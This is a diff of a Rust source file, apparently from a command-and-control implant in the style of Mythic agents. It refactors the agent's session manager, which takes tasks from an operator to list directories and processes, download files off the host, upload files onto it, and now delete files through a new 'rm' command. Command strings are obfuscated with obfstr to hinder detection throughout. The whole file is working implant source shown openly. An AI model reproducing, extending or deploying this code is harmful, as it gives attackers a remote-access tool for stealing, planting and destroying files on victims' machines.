@@ -1,4 +1,4 @@
-// 负责首次握手,心跳轮询等
+// 负责首次握手,心跳轮询,Piggybacking等
 
 use crate::ActiveStackWorkspace;
 use crate::commands::file::{FileDownloadSession, FileReceiveSession};
@@ -6,28 +6,21 @@ use crate::error::{AgentError, WisconsinError, WisconsinResult};
 use crate::profiles::crypto::CryptoContext;
 use crate::profiles::http::HttpProfile;
 use crate::protocol::{
-    CheckinMessage, FileBrowserChildItem, FileBrowserResponse, FileDownloadResponse,
-    FileUploadRequest, GetTaskingMessage, ProcessBrowserResponse, ProcessItem,
-    ServerCheckinResponse, ServerTaskPostResponseItem, ServerTaskingResponseRef,
-    TaskResponseItem,
+    CheckinMessage, FileBrowserChildItem, FileDownloadResponse, FileUploadRequest,
+    GetTaskingMessage, ProcessBrowserResponse, ProcessItem, ServerCheckinResponse,
+    ServerTaskPostResponseItem, ServerTaskingResponseRef, TaskResponseItem,
 };
 use crate::sysinfo::SysInfoWorkspace;
 use crate::transfer::TransferSession;
 use obfstr::obfstr;
 
 // ============ 结构化对象存储上限 ============
-const MAX_FILES_PER_SLOT: usize = 32;
+pub const MAX_FILES_PER_SLOT: usize = 32;
 const MAX_PROCESSES_PER_SLOT: usize = 32;
 const MAX_RESPONSE_SLOTS: usize = 16;
 
 /// 空文件条目占位（用于 const 初始化）
-const EMPTY_FILE_ENTRY: FileBrowserChildItem<'static> = FileBrowserChildItem {
-    is_file: false,
-    name: "",
-    access_time: 0,
-    modify_time: 0,
-    size: 0,
-};
+const EMPTY_FILE_ENTRY: FileBrowserChildItem<'static> = FileBrowserChildItem::EMPTY;
 
 /// 空进程条目占位（用于 const 初始化）
 const EMPTY_PROC_ENTRY: ProcessItem<'static> = ProcessItem {
@@ -45,121 +38,7 @@ const EMPTY_PROC_ENTRY: ProcessItem<'static> = ProcessItem {
     protected_process_level: None,
 };
 
-/// 活动下载会话状态 (纯栈无堆分配，固定缓冲区持久化跟踪)
-#[derive(Clone, Copy)]
-#[cfg_attr(any(debug_assertions, test), derive(Debug))]
-pub struct ActiveDownload {
-    pub task_id: [u8; 36],
-    pub task_id_len: usize,
-    pub path_buf: [u8; 260],
-    pub path_len: usize,
-    pub file_id: Option<[u8; 36]>,
-    pub total_size: i64,
-    pub current_offset: u64,
-    pub is_registered: bool,
-    pub is_complete: bool,
-}
-
-impl ActiveDownload {
-    pub fn new(task_id: &str, file_path: &str, total_size: i64) -> Self {
-        let mut tid = [0u8; 36];
-        let t_len = task_id.len().min(36);
-        tid[..t_len].copy_from_slice(&task_id.as_bytes()[..t_len]);
-
-        let mut p_buf = [0u8; 260];
-        let p_len = file_path.len().min(260);
-        p_buf[..p_len].copy_from_slice(&file_path.as_bytes()[..p_len]);
-
-        Self {
-            task_id: tid,
-            task_id_len: t_len,
-            path_buf: p_buf,
-            path_len: p_len,
-            file_id: None,
-            total_size,
-            current_offset: 0,
-            is_registered: false,
-            is_complete: false,
-        }
-    }
-
-    #[inline]
-    pub fn task_id_str(&self) -> &str {
-        core::str::from_utf8(&self.task_id[..self.task_id_len]).unwrap_or("")
-    }
-
-    #[inline]
-    pub fn path_str(&self) -> &str {
-        core::str::from_utf8(&self.path_buf[..self.path_len]).unwrap_or("")
-    }
-
-    #[inline]
-    pub fn file_id_str(&self) -> Option<&str> {
-        self.file_id
-            .as_ref()
-            .and_then(|id| core::str::from_utf8(id).ok())
-    }
-}
-
-/// 活动上传会话状态 (纯栈无堆分配，固定缓冲区持久化跟踪)
-#[derive(Clone, Copy)]
-#[cfg_attr(any(debug_assertions, test), derive(Debug))]
-pub struct ActiveUpload {
-    pub task_id: [u8; 36],
-    pub task_id_len: usize,
-    pub file_id: [u8; 36],
-    pub file_id_len: usize,
-    pub path_buf: [u8; 260],
-    pub path_len: usize,
-    pub current_chunk_num: u32,
-    pub total_chunks: u32,
-    pub chunk_size: u32,
-    pub is_complete: bool,
-}
-
-impl ActiveUpload {
-    pub fn new(task_id: &str, file_id: &str, remote_path: &str, chunk_size: u32) -> Self {
-        let mut tid = [0u8; 36];
-        let t_len = task_id.len().min(36);
-        tid[..t_len].copy_from_slice(&task_id.as_bytes()[..t_len]);
-
-        let mut fid = [0u8; 36];
-        let f_len = file_id.len().min(36);
-        fid[..f_len].copy_from_slice(&file_id.as_bytes()[..f_len]);
-
-        let mut p_buf = [0u8; 260];
-        let p_len = remote_path.len().min(260);
-        p_buf[..p_len].copy_from_slice(&remote_path.as_bytes()[..p_len]);
-
-        Self {
-            task_id: tid,
-            task_id_len: t_len,
-            file_id: fid,
-            file_id_len: f_len,
-            path_buf: p_buf,
-            path_len: p_len,
-            current_chunk_num: 1,
-            total_chunks: 0,
-            chunk_size,
-            is_complete: false,
-        }
-    }
-
-    #[inline]
-    pub fn task_id_str(&self) -> &str {
-        core::str::from_utf8(&self.task_id[..self.task_id_len]).unwrap_or("")
-    }
-
-    #[inline]
-    pub fn file_id_str(&self) -> &str {
-        core::str::from_utf8(&self.file_id[..self.file_id_len]).unwrap_or("")
-    }
-
-    #[inline]
-    pub fn path_str(&self) -> &str {
-        core::str::from_utf8(&self.path_buf[..self.path_len]).unwrap_or("")
-    }
-}
+pub use crate::commands::file::{ActiveDownload, ActiveUpload};
 
 /// Agent 运行会话核心管理器 (Agent Session Manager)
 pub struct AgentSession {
@@ -376,6 +255,7 @@ impl AgentSession {
             let cmd_ps = "ps";
             let cmd_download = "download";
             let cmd_upload = "upload";
+            let cmd_rm = "rm";
         }
 
         if cmd == cmd_sleep {
@@ -478,230 +358,40 @@ impl AgentSession {
             let path_param = extract_param(params, obfstr!("path"));
             obfstr!(let dot = ".";);
             let target_path = if path_param.is_empty() { dot } else { path_param };
-            self.emit_file_browser(task.id, target_path, exec_ws);
+            crate::commands::file::execute_ls(task.id, target_path, exec_ws);
         } else if cmd == cmd_ps {
             // ====== 结构化 processes 上报（通过 CreateToolhelp32Snapshot 枚举系统进程） ======
             self.emit_process_browser(task.id, exec_ws);
         } else if cmd == cmd_download {
-            let path_param = extract_param(params, obfstr!("file_path"));
-            let target_file = if path_param.is_empty() {
-                let p = extract_param(params, obfstr!("path"));
-                if p.is_empty() {
-                    extract_param(params, obfstr!("file"))
-                } else {
-                    p
-                }
-            } else {
-                path_param
-            };
-            if !target_file.is_empty() {
-                #[cfg(windows)]
-                let size_opt = crate::stream::NativeFileHandle::open_read(target_file)
-                    .ok()
-                    .and_then(|h| h.file_size().ok())
-                    .map(|s| s as i64);
-                #[cfg(not(windows))]
-                let size_opt = std::fs::metadata(target_file).ok().map(|m| m.len() as i64);
-
-                if let Some(file_size) = size_opt {
-                    let filename = extract_filename(target_file);
-                    let file_sess = FileDownloadSession::new(
-                        task.id,
-                        Some(target_file),
-                        Some(filename),
-                        file_size,
-                    );
-                    let reg_resp = file_sess.build_registration_response();
-                    let dl = ActiveDownload::new(task.id, target_file, file_size);
-                    exec_ws.record_download_response(
-                        task.id,
-                        reg_resp,
-                        obfstr!("file download registration initiated"),
-                        true,
-                        false,
-                    );
-                    self.active_download = Some(dl);
-                } else {
-                    exec_ws.record_response(task.id, obfstr!("file not found"), false, true);
-                }
-            } else {
-                exec_ws.record_response(task.id, obfstr!("missing file path argument"), false, true);
-            }
+            crate::commands::file::execute_download(
+                task.id,
+                params,
+                exec_ws,
+                &mut self.active_download,
+            );
         } else if cmd == cmd_upload {
-            let remote_path = {
-                let p = extract_param(params, obfstr!("remote_path"));
-                if p.is_empty() {
-                    let p2 = extract_param(params, obfstr!("path"));
-                    if p2.is_empty() {
-                        extract_param(params, obfstr!("destination"))
-                    } else {
-                        p2
-                    }
-                } else {
-                    p
-                }
-            };
-            let file_id = {
-                let fid = extract_param(params, obfstr!("file"));
-                if fid.is_empty() {
-                    extract_param(params, obfstr!("file_id"))
-                } else {
-                    fid
-                }
-            };
-            if !remote_path.is_empty() && !file_id.is_empty() {
-                let chunk_size = 512 * 1024;
-                if let Ok(recv_sess) = FileReceiveSession::new(task.id, file_id, chunk_size, Some(remote_path)) {
-                    let req = recv_sess.session.build_chunk_request();
-                    let ul = ActiveUpload::new(task.id, file_id, remote_path, chunk_size);
-                    exec_ws.record_upload_response(
-                        task.id,
-                        req,
-                        obfstr!("file upload initiated"),
-                        true,
-                        false,
-                    );
-                    self.active_upload = Some(ul);
-                } else {
-                    exec_ws.record_response(task.id, obfstr!("failed to initialize upload session (invalid UUID)"), false, true);
-                }
-            } else {
-                exec_ws.record_response(task.id, obfstr!("missing remote_path or file argument"), false, true);
-            }
+            crate::commands::file::execute_upload(
+                task.id,
+                params,
+                exec_ws,
+                &mut self.active_upload,
+            );
+        } else if cmd == cmd_rm {
+            crate::commands::file::execute_rm(task.id, params, exec_ws);
         } else {
             exec_ws.record_response(task.id, obfstr!("command not implemented"), false, true);
         }
     }
 
-    /// 枚举目录并生成结构化 file_browser 上报
-    fn emit_file_browser(
+    /// 枚举目录并生成结构化 file_browser 上报 (委托至 commands::file::execute_ls)
+    #[inline]
+    pub fn emit_file_browser(
         &self,
         task_id: &str,
         target_path: &str,
         exec_ws: &mut TaskExecutionWorkspace,
     ) {
-        let mut parent_buf = [0u8; 512];
-        #[cfg(windows)]
-        let parent_len = {
-            let mut wpath = [0u16; 260];
-            let mut wpath_len = 0;
-            for c in target_path.encode_utf16() {
-                if wpath_len < wpath.len() - 1 {
-                    wpath[wpath_len] = c;
-                    wpath_len += 1;
-                }
-            }
-            wpath[wpath_len] = 0;
-
-            let mut wbuf = [0u16; 260];
-            let wlen = unsafe {
-                win32::GetFullPathNameW(
-                    wpath.as_ptr(),
-                    wbuf.len() as u32,
-                    wbuf.as_mut_ptr(),
-                    core::ptr::null_mut(),
-                )
-            };
-            if wlen > 0 && (wlen as usize) < wbuf.len() {
-                let mut off = 0;
-                for ch in core::char::decode_utf16(wbuf[..wlen as usize].iter().copied()) {
-                    let c = ch.unwrap_or(core::char::REPLACEMENT_CHARACTER);
-                    if off + c.len_utf8() <= parent_buf.len() {
-                        let s = c.encode_utf8(&mut parent_buf[off..]);
-                        off += s.len();
-                    }
-                }
-                off
-            } else {
-                let n = target_path.len().min(parent_buf.len());
-                parent_buf[..n].copy_from_slice(&target_path.as_bytes()[..n]);
-                n
-            }
-        };
-        #[cfg(not(windows))]
-        let parent_len = {
-            let abs = std::fs::canonicalize(target_path)
-                .ok()
-                .and_then(|p| p.to_str().map(|s| s.as_bytes().to_vec()))
-                .unwrap_or_else(|| target_path.as_bytes().to_vec());
-            let n = abs.len().min(parent_buf.len());
-            parent_buf[..n].copy_from_slice(&abs[..n]);
-            n
-        };
-
-        let parent_path = core::str::from_utf8(&parent_buf[..parent_len]).unwrap_or(target_path);
-        let dir_name = extract_filename(parent_path);
-        let dir_name = if dir_name.is_empty() { parent_path } else { dir_name };
-
-        let dir_meta = std::fs::metadata(target_path).ok();
-        let dir_is_file = dir_meta.as_ref().map(|m| m.is_file()).unwrap_or(false);
-        let dir_size = dir_meta.as_ref().map(|m| m.len()).unwrap_or(0);
-        let dir_atime = dir_meta
-            .as_ref()
-            .and_then(|m| m.accessed().ok())
-            .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
-            .map(|d| d.as_millis() as u64)
-            .unwrap_or(0);
-        let dir_mtime = dir_meta
-            .as_ref()
-            .and_then(|m| m.modified().ok())
-            .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
-            .map(|d| d.as_millis() as u64)
-            .unwrap_or(0);
-
-        // 栈上临时收集条目名与元数据
-        let mut names_buf = [[0u8; 260]; MAX_FILES_PER_SLOT];
-        let mut names_len = [0usize; MAX_FILES_PER_SLOT];
-        let mut entry_meta = [(false, 0u64, 0u64, 0u64); MAX_FILES_PER_SLOT];
-        let mut entry_count = 0usize;
-
-        if let Ok(read) = std::fs::read_dir(target_path) {
-            for entry in read.flatten() {
-                if entry_count >= MAX_FILES_PER_SLOT {
-                    break;
-                }
-                let Ok(ft) = entry.file_type() else { continue };
-                let Ok(md) = entry.metadata() else { continue };
-                let fname = entry.file_name();
-                let name_str = match fname.to_str() {
-                    Some(s) => s,
-                    None => continue,
-                };
-                let n_bytes = name_str.as_bytes();
-                let n_len = n_bytes.len().min(names_buf[entry_count].len());
-                names_buf[entry_count][..n_len].copy_from_slice(&n_bytes[..n_len]);
-                names_len[entry_count] = n_len;
-
-                let atime = md
-                    .accessed()
-                    .ok()
-                    .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
-                    .map(|d| d.as_millis() as u64)
-                    .unwrap_or(0);
-                let mtime = md
-                    .modified()
-                    .ok()
-                    .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
-                    .map(|d| d.as_millis() as u64)
-                    .unwrap_or(0);
-
-                entry_meta[entry_count] = (ft.is_file(), atime, mtime, md.len());
-                entry_count += 1;
-            }
-        }
-
-        exec_ws.record_file_browser_from_parts(
-            task_id,
-            dir_name,
-            parent_path,
-            dir_is_file,
-            dir_size,
-            dir_atime,
-            dir_mtime,
-            &names_buf[..entry_count],
-            &names_len[..entry_count],
-            &entry_meta[..entry_count],
-        );
+        crate::commands::file::execute_ls(task_id, target_path, exec_ws);
     }
 
     /// 枚举进程并生成结构化 processes 上报
@@ -1137,16 +827,7 @@ pub fn extract_param<'a>(raw: &'a str, key: &str) -> &'a str {
     ""
 }
 
-/// 零堆从文件路径中截取纯文件名
-#[inline]
-pub fn extract_filename(path: &str) -> &str {
-    let clean = path.trim_end_matches(['\\', '/']);
-    if let Some(pos) = clean.rfind(['\\', '/']) {
-        &clean[pos + 1..]
-    } else {
-        clean
-    }
-}
+pub use crate::commands::file::extract_filename;
 
 /// 单项下载元数据存储暂存
 #[derive(Clone, Copy)]
@@ -1584,13 +1265,14 @@ impl TaskExecutionWorkspace {
             };
 
             let (is_f, atime, mtime, sz) = entries_meta[k];
-            self.file_entries_cache[k] = FileBrowserChildItem {
-                is_file: is_f,
-                name: name_ref,
-                access_time: atime,
-                modify_time: mtime,
-                size: sz,
-            };
+            self.file_entries_cache[k] = crate::commands::file::build_file_browser_child(
+                is_f,
+                name_ref,
+                atime,
+                mtime,
+                sz,
+                None,
+            );
             written += 1;
         }
         meta.file_count = written;
@@ -1830,19 +1512,16 @@ impl TaskExecutionWorkspace {
                     &[]
                 };
 
-                item.file_browser = Some(FileBrowserResponse {
-                    host: None,
-                    is_file: meta.is_file,
-                    name: name_str,
-                    parent_path: parent_str,
-                    success: meta.success,
-                    access_time: meta.access_time,
-                    modify_time: meta.modify_time,
-                    size: meta.size,
-                    update_deleted: None,
-                    set_as_user_output: None,
-                    files: files_slice,
-                });
+                item.file_browser = Some(crate::commands::file::build_file_browser_response(
+                    name_str,
+                    parent_str,
+                    meta.is_file,
+                    meta.size,
+                    meta.access_time,
+                    meta.modify_time,
+                    meta.success,
+                    files_slice,
+                ));
             }
 
             if self.process_metas[i].is_set {
@@ -1915,12 +1594,6 @@ mod win32 {
     unsafe extern "system" {
         pub fn GetCurrentDirectoryW(nBufferLength: u32, lpBuffer: *mut u16) -> u32;
         pub fn SetCurrentDirectoryW(lpPathName: *const u16) -> BOOL;
-        pub fn GetFullPathNameW(
-            lpFileName: *const u16,
-            nBufferLength: u32,
-            lpBuffer: *mut u16,
-            lpFilePart: *mut *mut u16,
-        ) -> u32;
         pub fn CreateToolhelp32Snapshot(dwFlags: u32, th32ProcessID: u32) -> HANDLE;
         pub fn Process32FirstW(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32W) -> BOOL;
         pub fn Process32NextW(hSnapshot: HANDLE, lppe: *mut PROCESSENTRY32W) -> BOOL;
